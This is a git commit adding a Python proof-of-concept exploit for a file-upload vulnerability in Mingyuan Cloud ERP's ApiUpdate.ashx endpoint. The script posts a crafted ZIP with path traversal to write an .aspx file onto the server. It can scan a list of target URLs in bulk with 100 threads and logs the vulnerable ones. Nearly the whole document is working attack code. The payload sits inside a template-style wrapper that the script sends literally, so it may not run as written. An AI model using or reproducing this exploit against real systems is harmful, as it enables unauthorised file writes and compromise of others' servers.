85df58e3c565b4b34668e2e7c02193582414b977
CHKer109 <642971737@qq.com>
2024-08-16 16:56:03 +0800

    明源云 ERP ApiUpdate.ashx 文件上传漏洞

---
+++ POC_60.py
@@ -0,0 +1,66 @@
+#明源云 ERP ApiUpdate.ashx 文件上传漏洞
+#导包外置
+import requests,argparse,sys
+from multiprocessing.dummy import Pool
+# 关闭告警
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test = """  ___        _ _   _           _       _       
+ / _ \      (_) | | |         | |     | |      
+/ /_\ \_ __  _| | | |_ __   __| | __ _| |_ ___ 
+|  _  | '_ \| | | | | '_ \ / _` |/ _` | __/ _ \
+| | | | |_) | | |_| | |_) | (_| | (_| | ||  __/
+\_| |_/ .__/|_|\___/| .__/ \__,_|\__,_|\__\___|
+      | |           | |                        
+      |_|           |_|                        
+                                        author :CHKer
+                                        version:1.0.0
+  """
+    print(test)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="明源云 ERP ApiUpdate.ashx 文件上传漏洞")
+    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
+    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file, 'r', encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip().replace('\n', ''))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python {sys.argv[0]} -h")
+
+def poc(target):
+    payload = "/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a"
+    headers = {
+        'Accept-Encoding': 'gzip',
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
+        'Content-Length': '856',
+    }
+    data = """{{unquote("PK\x03\x04\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00../../../fdccloud/_/check.aspx$\xcc\xcb\x0a\xc20\x14\x04\xd0_\x09\x91B\xbb\x09\x0a\xddH\xab\x29\x8aP\xf0QZ\xc4\xf5m\x18j!ib\x1e\x82\x7fo\xc4\xdd0g\x98:\xdb\xb1\x96F\xb03\xcdcLa\xc3\x0f\x0b\xce\xb2m\x9d\xa0\xd1\xd6\xb8\xc0\xae\xa4\xe1-\xc9d\xfd\xc7\x07h\xd1\xdc\xfe\x13\xd6%0\xb3\x87x\xb8\x28\xe7R\x96\xcbr5\xacyQ\x9d&\x05q\x84B\xea\x7b\xb87\x9c\xb8\x90m\x28<\xf3\x0e\xaf\x08\x1f\xc4\xdd\x28\xb1\x1f\xbcQ1\xe0\x07EQ\xa5\xdb/\x00\x00\x00\xff\xff\x03\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00../../../fdccloud/_/check.aspxPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00L\x00\x00\x00\xc8\x00\x00\x00\x00\x00")}}"""
+    proxies = {
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    }
+    try:
+        res1 = requests.post(url=target+payload,headers=headers,data=data,timeout=10,verify=False,proxies=proxies)
+        if res1.status_code == 200:
+            print(f"[+]该url:{target}存在漏洞")
+            with open('result60.txt','a', encoding='utf-8') as fp:
+                fp.write(f"{target}"+"\n")
+        else:
+            print(f'[-]该url:{target}不存在漏洞')
+    except:
+        print(f'[-]该url:{target}该站点存在问题')
+
+if __name__ == '__main__':
+    main()
